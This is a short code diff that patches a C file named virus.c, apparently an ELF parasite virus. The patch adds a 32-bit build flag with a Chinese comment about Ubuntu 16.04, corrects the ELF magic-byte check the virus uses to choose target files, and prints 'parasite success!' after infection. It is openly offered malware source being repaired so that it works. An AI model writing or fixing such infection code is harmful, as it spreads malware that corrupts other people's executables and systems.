@@ -17,7 +17,7 @@
  * The code is position independent and eludes libc through syscall macros. 
  * 
  * Compile:
- * gcc virus.c -o virus -nostdlib
+ * gcc virus.c -o virus -nostdlib -m32  #在ubuntu 1604 x86_64架构
  *
  * elfmaster[at]zoho.com
  *
@@ -139,7 +139,8 @@ do_main()
     c = read (fd, mem, st.st_size);
  
     e_hdr = (Elf32_Ehdr *) mem;
-    if (e_hdr->e_ident[0] != 0x7f && strcmp (&e_hdr->e_ident[1], "ELF")) 
+    //if (e_hdr->e_ident[0] != 0x7f && strcmp (&e_hdr->e_ident[1], "ELF")) 
+    if ((e_hdr->e_ident[0] != 0x7f) || (e_hdr->e_ident[1] != 'E') || (e_hdr->e_ident[2] != 'L') || (e_hdr->e_ident[3] !='F'))
     {
     	   close (fd);
    	   continue;
@@ -215,6 +216,8 @@ do_main()
   }
       done:
       close (dd);
+	  char print_string[] = {'p', 'a', 'r', 'a', 's', 'i', 't', 'e', ' ', 's', 'u', 'c', 'c', 'e', 's', 's', '!', '\n'};
+	  write(1, print_string, sizeof(print_string));
   }
  
 void
